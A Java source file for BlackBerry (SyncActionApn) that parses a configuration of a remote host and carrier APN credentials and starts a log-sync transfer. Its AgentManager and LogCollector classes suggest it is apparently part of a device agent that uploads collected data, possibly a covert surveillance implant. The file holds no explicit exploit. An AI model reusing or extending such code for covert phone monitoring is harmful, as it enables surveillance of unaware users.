//#preprocess
package blackberry.action;

import java.io.EOFException;
import java.util.Vector;

import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.log.LogCollector;
import blackberry.transfer.Transfer;
import blackberry.utils.Check;
import blackberry.utils.WChar;

public class SyncActionApn extends SyncAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncActionApn", DebugLevel.VERBOSE);
    //#endif

    String host;

    public SyncActionApn(final int actionId_, final byte[] confParams) {
        super(actionId_);

        apns = new Vector();
        parse(confParams);

        //#ifdef DBC
        Check.requires(actionId == ACTION_SYNC_APN, "Wrong ActionId");
        //#endif

        logCollector = LogCollector.getInstance();
        agentManager = AgentManager.getInstance();
        transfer = Transfer.getInstance();

        wifi = false;
        gprs = false   ;

    }

    protected SyncActionApn(final int actionId) {
        super(actionId);
    }

    protected boolean parse(final byte[] confParams) {

        //#ifdef DBC
        Check.requires(apns != null, "parse: apns null");
        //#endif
        
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            final int hostLen = databuffer.readInt();
            final byte[] hostRaw = new byte[hostLen];

            databuffer.readFully(hostRaw);
            host = WChar.getString(hostRaw, true);

            //#ifdef DEBUG_TRACE
            debug.trace("host: " + host);
            //#endif

            final int entries = databuffer.readInt(); // readByte();
            int len;
            byte[] stringRaw;

            for (int i = 0; i < entries; i++) {
                final Apn apn = new Apn();
                apn.mcc = databuffer.readInt(); // readShort();
                apn.mnc = databuffer.readInt(); // readShort();

                len = databuffer.readInt(); // readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.apn = WChar.getString(stringRaw, true);

                len = databuffer.readInt(); // readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.user = WChar.getString(stringRaw, true);

                len = databuffer.readInt(); //readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.pass = WChar.getString(stringRaw, true);

                //#ifdef DEBUG_TRACE
                debug.trace("adding apn: " + apn);
                //#endif
                apns.addElement(apn);
            }

            //#ifdef DBC
            Check.ensures(apns.size() == entries, "parse apns entries");
            //#endif

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }
        return true;
    }

    protected void transferInit() {
        transfer.initApn(host, port, ssl, wifiForced, wifi, gprs, apns);
    }

    public String toString() {
        final StringBuffer sb = new StringBuffer();
        sb.append("SyncApn " + host+ " ( ");

        for (int i = 0; i < apns.size(); i++) {
            final Apn apn = (Apn) apns.elementAt(i);
            sb.append(apn);
            sb.append(" ");
        }
        sb.append(" )");
        return sb.toString();
    }
}
